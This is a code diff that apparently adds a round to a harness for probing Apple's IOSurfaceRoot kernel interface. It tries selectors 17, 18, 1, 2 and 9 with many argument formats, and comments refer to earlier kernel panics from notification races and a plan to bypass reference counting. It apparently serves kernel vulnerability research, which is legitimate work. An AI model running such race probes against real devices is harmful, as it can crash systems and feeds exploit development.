@@ -1728,6 +1728,184 @@ static void *r259_unreg_fn(void *arg) {
     return NULL;
 }
 
+/* r264: Probe IOSurfaceRoot sel17 (s_set_surface_notify) with REAL surface IDs
+ * The earlier 100+ panics came from sel17/18 notification races.
+ * Current sel17 code uses dummy args ({1,2,3}) → BadArgument.
+ * This round tries every plausible argument format with real surface IDs
+ * to find the correct format that makes sel17 succeed (kr=0). */
+static volatile int r264_run = 0;
+static volatile int r264_probed = 0;
+
+static void r264_probe_sel17(io_connect_t conn, IOSurfaceRef surf) {
+    uint32_t sid = IOSurfaceGetID(surf);
+    kern_return_t kr;
+    mach_port_t wp = MACH_PORT_NULL;
+    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+    mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+    uint64_t ref = 0x1234;
+
+    rlog("  Probing sel17 with surfaceID=%u port=%u\n", sid, wp);
+
+    /* Format A: scalar[0]=surfaceID, no struct */
+    {
+        uint64_t sc[1] = {sid};
+        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
+        rlog("    A) scalar[surfID] no-struct: kr=0x%x\n", kr);
+    }
+    /* Format B: scalar[0]=surfID scalar[1]=0 */
+    {
+        uint64_t sc[2] = {sid, 0};
+        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1, sc, 2, NULL, 0, NULL, NULL, NULL, NULL);
+        rlog("    B) scalar[surfID,0]: kr=0x%x\n", kr);
+    }
+    /* Format C: scalar[0]=surfID scalar[1]=1 */
+    {
+        uint64_t sc[2] = {sid, 1};
+        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1, sc, 2, NULL, 0, NULL, NULL, NULL, NULL);
+        rlog("    C) scalar[surfID,1]: kr=0x%x\n", kr);
+    }
+    /* Format D: no scalars, struct={surfID as u32} (4 bytes) */
+    {
+        uint32_t st[1] = {sid};
+        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1, NULL, 0, st, 4, NULL, NULL, NULL, NULL);
+        rlog("    D) struct[u32:surfID]: kr=0x%x\n", kr);
+    }
+    /* Format E: no scalars, struct={surfID as u32, 0} (8 bytes) */
+    {
+        uint32_t st[2] = {sid, 0};
+        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1, NULL, 0, st, 8, NULL, NULL, NULL, NULL);
+        rlog("    E) struct[u32:surfID,0]: kr=0x%x\n", kr);
+    }
+    /* Format F: no scalars, struct={surfID as u64} (8 bytes) */
+    {
+        uint64_t st[1] = {sid};
+        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1, NULL, 0, st, 8, NULL, NULL, NULL, NULL);
+        rlog("    F) struct[u64:surfID]: kr=0x%x\n", kr);
+    }
+    /* Format G: scalar[surfID], struct={0,0,0} 24 bytes */
+    {
+        uint64_t sc[1] = {sid};
+        uint64_t st[3] = {0, 0, 0};
+        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1, sc, 1, st, 24, NULL, NULL, NULL, NULL);
+        rlog("    G) scalar[surfID] struct[0,0,0]: kr=0x%x\n", kr);
+    }
+    /* Format H: scalar[surfID,1], struct={0} */
+    {
+        uint64_t sc[2] = {sid, 1};
+        uint64_t st[1] = {0};
+        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1, sc, 2, st, 8, NULL, NULL, NULL, NULL);
+        rlog("    H) scalar[surfID,1] struct[0]: kr=0x%x\n", kr);
+    }
+    /* Format I: Synchronous (not async) with scalar[surfID] */
+    {
+        uint64_t sc[1] = {sid};
+        kr = IOConnectCallScalarMethod(conn, 17, sc, 1, NULL, NULL);
+        rlog("    I) SYNC scalar[surfID]: kr=0x%x\n", kr);
+    }
+    /* Format J: Sync scalar[surfID,0] */
+    {
+        uint64_t sc[2] = {sid, 0};
+        kr = IOConnectCallScalarMethod(conn, 17, sc, 2, NULL, NULL);
+        rlog("    J) SYNC scalar[surfID,0]: kr=0x%x\n", kr);
+    }
+    /* Format K: Sync scalar[surfID,1] */
+    {
+        uint64_t sc[2] = {sid, 1};
+        kr = IOConnectCallScalarMethod(conn, 17, sc, 2, NULL, NULL);
+        rlog("    K) SYNC scalar[surfID,1]: kr=0x%x\n", kr);
+    }
+    /* Format L: Sync struct only {surfID as u32} */
+    {
+        uint32_t st = sid;
+        kr = IOConnectCallMethod(conn, 17, NULL, 0, &st, 4, NULL, NULL, NULL, NULL);
+        rlog("    L) SYNC struct[u32:surfID]: kr=0x%x\n", kr);
+    }
+
+    /* Also try sel18 (s_remove_surface_notify) with the same formats */
+    rlog("  Probing sel18 with surfaceID=%u\n", sid);
+    /* Format A for sel18: scalar[surfID] */
+    {
+        uint64_t sc[1] = {sid};
+        kr = IOConnectCallAsyncMethod(conn, 18, wp, &ref, 1, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
+        rlog("    sel18-A) scalar[surfID]: kr=0x%x\n", kr);
+    }
+    /* Format B for sel18: scalar[surfID,0] */
+    {
+        uint64_t sc[2] = {sid, 0};
+        kr = IOConnectCallAsyncMethod(conn, 18, wp, &ref, 1, sc, 2, NULL, 0, NULL, NULL, NULL, NULL);
+        rlog("    sel18-B) scalar[surfID,0]: kr=0x%x\n", kr);
+    }
+    /* Format I for sel18: sync scalar[surfID] */
+    {
+        uint64_t sc[1] = {sid};
+        kr = IOConnectCallScalarMethod(conn, 18, sc, 1, NULL, NULL);
+        rlog("    sel18-I) SYNC scalar[surfID]: kr=0x%x\n", kr);
+    }
+    /* Format J for sel18: sync scalar[surfID,0] */
+    {
+        uint64_t sc[2] = {sid, 0};
+        kr = IOConnectCallScalarMethod(conn, 18, sc, 2, NULL, NULL);
+        rlog("    sel18-J) SYNC scalar[surfID,0]: kr=0x%x\n", kr);
+    }
+    /* Format L for sel18: struct only {surfID u32} */
+    {
+        uint32_t st = sid;
+        kr = IOConnectCallMethod(conn, 18, NULL, 0, &st, 4, NULL, NULL, NULL, NULL);
+        rlog("    sel18-L) SYNC struct[u32:surfID]: kr=0x%x\n", kr);
+    }
+
+    /* Also probe sel1 (s_release_surface) with real surface ID */
+    rlog("  Probing sel1 with surfaceID=%u\n", sid);
+    {
+        uint64_t sc[1] = {sid};
+        kr = IOConnectCallScalarMethod(conn, 1, sc, 1, NULL, NULL);
+        rlog("    sel1-I) scalar[surfID]: kr=0x%x\n", kr);
+    }
+    {
+        uint64_t sc[2] = {sid, 0};
+        kr = IOConnectCallScalarMethod(conn, 1, sc, 2, NULL, NULL);
+        rlog("    sel1-J) scalar[surfID,0]: kr=0x%x\n", kr);
+    }
+    {
+        uint32_t st = sid;
+        kr = IOConnectCallMethod(conn, 1, NULL, 0, &st, 4, NULL, NULL, NULL, NULL);
+        rlog("    sel1-L) struct[u32:surfID]: kr=0x%x\n", kr);
+    }
+
+    /* Probe sel2 (s_lookup_surface) */
+    rlog("  Probing sel2 (lookup) with surfaceID=%u\n", sid);
+    {
+        uint64_t sc_in[1] = {sid};
+        uint64_t sc_out[4] = {0};
+        uint32_t out_cnt = 4;
+        kr = IOConnectCallScalarMethod(conn, 2, sc_in, 1, sc_out, &out_cnt);
+        rlog("    sel2) scalar[surfID]: kr=0x%x out_cnt=%u", kr, out_cnt);
+        if (kr == 0) rlog(" out[0]=0x%llx", sc_out[0]);
+        rlog("\n");
+    }
+
+    /* Probe sel9 (s_get_value) with surface ID */
+    rlog("  Probing sel9 (get_value) with surfaceID=%u\n", sid);
+    {
+        uint64_t sc_in[2] = {sid, 0};
+        uint64_t sc_out[4] = {0};
+        uint32_t out_cnt = 4;
+        kr = IOConnectCallScalarMethod(conn, 9, sc_in, 2, sc_out, &out_cnt);
+        rlog("    sel9) scalar[surfID,0]: kr=0x%x\n", kr);
+    }
+    {
+        uint64_t sc_in[1] = {sid};
+        char struct_out[256] = {0};
+        size_t so_sz = 256;
+        kr = IOConnectCallMethod(conn, 9, sc_in, 1, NULL, 0, NULL, NULL, struct_out, &so_sz);
+        rlog("    sel9b) scalar[surfID] struct_out: kr=0x%x so_sz=%zu\n", kr, so_sz);
+    }
+
+    mach_port_deallocate(mach_task_self(), wp);
+    __sync_fetch_and_add(&r264_probed, 1);
+    fflush(stdout);
+}
+
 /* r263: IOSurface Mach port no-senders race + direct IOSurfaceRoot sel1 race
  * Strategy: bypass Metal's reference counting entirely.
  * 1) Create IOSurface → Mach port → drop all refs → no-senders notification
@@ -20816,6 +20994,56 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 264) {
+            rlog("*** rounds=264: Probe IOSurfaceRoot sel17 argument format ***\n");
+            rlog("  Try every plausible arg format with REAL surface IDs\n");
+            rlog("  Goal: find format that makes sel17 return kr=0\n\n");
+
+            io_service_t r264_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            io_connect_t r264_conn = IO_OBJECT_NULL;
+            if (r264_svc) {
+                kern_return_t kr = IOServiceOpen(r264_svc, mach_task_self(), 0, &r264_conn);
+                rlog("  IOSurfaceRoot open: kr=0x%x conn=%u\n", kr, r264_conn);
+            }
+
+            if (r264_conn) {
+                /* Create a test IOSurface */
+                int w = 64, h = 64, bpe = 4, bpr = w * bpe, pf = 0x42475241;
+                int alloc_sz = bpr * h;
+                CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+                CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+                CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+                CFNumberRef rn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+                CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+                CFNumberRef asn = CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz);
+                CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+                CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+                CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+                CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn);
+                CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+                CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), asn);
+                IOSurfaceRef surf = IOSurfaceCreate(props);
+                CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn); CFRelease(pfn); CFRelease(asn);
+                CFRelease(props);
+
+                if (surf) {
+                    rlog("  Created test IOSurface: id=%u addr=%p\n", IOSurfaceGetID(surf), (void*)surf);
+                    r264_probe_sel17(r264_conn, surf);
+                    CFRelease(surf);
+                } else {
+                    rlog("  FAIL: could not create test IOSurface\n");
+                }
+
+                IOServiceClose(r264_conn);
+            }
+            if (r264_svc) IOObjectRelease(r264_svc);
+
+            rlog("*** r=264 complete ***\n");
             goto done;
         }
         if (rounds == 263) {
